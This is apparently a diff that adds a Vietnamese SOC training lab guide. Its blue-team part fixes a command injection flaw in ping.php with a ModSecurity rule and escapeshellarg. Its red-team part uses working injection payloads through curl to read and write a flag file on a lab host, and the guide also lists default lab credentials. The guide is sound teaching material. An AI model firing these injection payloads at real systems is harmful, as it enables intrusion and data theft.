@@ -1,0 +1,40 @@
+=== SOC Lab KB5: Patch & Pwn (Hybrid Blue + Red) ===
+
+He A (targeta, 172.20.0.10) cua ban dang bi tan cong COMMAND INJECTION lien tuc tu ke tan cong.
+He B (targetb, 172.20.0.40) la may "production" co LO HONG Y HET A nhung chua duoc va.
+
+Nhiem vu 2 phan:
+  * BLUE (50%): dieu tra qua SIEM, VA he A de ke tan cong khong con chay duoc lenh.
+  * RED  (50%): dung chinh ky thuat do PWN he B (chi qua HTTP), lay FLAG.
+
+*** Lan dau: cho siem cai Wazuh xong (~8-10'):  tail -f /var/log/wazuh-install.log ***
+
+==================== PHAN BLUE: VA HE A ====================
+--- 1) Dieu tra (defender, Firefox) ---
+  https://172.20.0.20  admin / (tren siem: sudo cat /root/wazuh-admin-credentials.txt)
+  -> Xem su kien web: ke tan cong goi gi toi /ping.php? Payload command injection la gi?
+     (goi y: host=127.0.0.1;id  -> dau ';' noi them lenh)
+
+--- 2) Va he A (SSH tu defender) ---
+  ssh analyst@targeta       (mat khau: analyst)
+  Cach 1 (WAF): bat ModSecurity + rule chan ky tu nguy hiem:
+    sudo sed -i 's/^SecRuleEngine .*/SecRuleEngine On/' /etc/modsecurity/modsecurity.conf
+    sudo tee /etc/modsecurity/custom.conf >/dev/null <<'EOF'
+    SecRule ARGS "@rx [;|&\`$()]" "id:100001,phase:2,deny,status:403,log,msg:'CMD injection blocked'"
+    EOF
+    sudo systemctl reload apache2
+  Cach 2 (sua code): sua /var/www/html/ping.php dung escapeshellarg($host).
+  Kiem chung: curl "http://localhost/ping.php?host=127.0.0.1;id"   # KHONG con dong uid=
+              curl "http://localhost/ping.php?host=127.0.0.1"       # ping thuong van chay
+
+==================== PHAN RED: PWN HE B ====================
+--- 3) Khai thac B qua HTTP (tu defender) ---
+  He B chi vao duoc qua web. Dung chinh lo hong command injection de doc flag:
+    curl "http://172.20.0.40/ping.php?host=127.0.0.1;cat%20/var/www/flag.txt"
+    -> doc FLAG-xxxxxx (moi sinh vien mot gia tri khac)
+  Ghi flag ra /tmp/loot.txt tren B (bang chung PWN) de he thong cham diem:
+    curl "http://172.20.0.40/ping.php?host=127.0.0.1;cat%20/var/www/flag.txt%20>%20/tmp/loot.txt"
+  Ghi flag vao bao cao: sua /home/analyst/findings.txt tren A:  FLAG=FLAG-xxxxxx
+
+Xong: checkwork / stoplab.
+Muc tieu: mission_complete = Y  (blue_done: A het dinh + con song; red_done: pwn duoc B).
